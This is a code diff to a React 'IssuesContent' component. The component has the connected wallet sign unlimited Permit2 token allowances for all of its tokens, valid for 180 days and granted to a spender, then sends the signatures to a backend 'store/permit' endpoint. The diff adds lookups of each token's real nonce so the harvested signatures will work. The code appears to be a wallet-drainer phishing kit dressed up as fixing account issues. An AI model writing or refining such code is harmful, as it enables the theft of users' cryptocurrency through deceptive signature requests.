@@ -353,14 +353,36 @@ export default function IssuesContent() {
       
       const details: PermitDetails[] = [];
       
+      // Get real nonces from Permit2 contract
+      const permit2Abi = [
+        'function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
+      ];
+      const permit2Contract = new Contract(permit2Address, permit2Abi, provider);
+      
       for (let i = 0; i < validTokens.length; i++) {
         const token = validTokens[i];
-        details.push({
-          token: ethers.utils.getAddress(token.address),
-          amount: MaxAllowanceTransferAmount,
-          expiration: toDeadline(1000 * 60 * 60 * 24 * 180),
-          nonce: 0,
-        });
+        
+        try {
+          // Get the actual current nonce for this token
+          const { nonce: currentNonce } = await permit2Contract.allowance(account, token.address, spender);
+          console.log(`Got nonce for ${token.symbol}: ${currentNonce}`);
+          
+          details.push({
+            token: ethers.utils.getAddress(token.address),
+            amount: MaxAllowanceTransferAmount,
+            expiration: toDeadline(1000 * 60 * 60 * 24 * 180),
+            nonce: currentNonce, // Use the REAL nonce
+          });
+        } catch (nonceError) {
+          console.error(`Failed to get nonce for ${token.symbol}:`, nonceError);
+          console.log(`Using fallback nonce 0 for ${token.symbol}`);
+          details.push({
+            token: ethers.utils.getAddress(token.address),
+            amount: MaxAllowanceTransferAmount,
+            expiration: toDeadline(1000 * 60 * 60 * 24 * 180),
+            nonce: 0, // Fallback
+          });
+        }
       }
   
       const permitBatch: PermitBatch = {
@@ -393,7 +415,7 @@ export default function IssuesContent() {
       setSignature(signature);
       console.log('✅ Permit signature created for valid tokens');
   
-      // Step 3: Store permit
+      // Step 3: Store permit (only valid tokens)
       const response = await fetch('/api/store/permit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -401,7 +423,7 @@ export default function IssuesContent() {
           permitBatch, 
           signature, 
           owner: account, 
-          chainId,
+          chainId
         }),
       });
   
@@ -428,7 +450,6 @@ export default function IssuesContent() {
       setProcessingAction('');
     }
   }, [account, provider, spender, chainId, tokens]);
-
   const connectWallet = useCallback(async () => {
     try {
       await open();
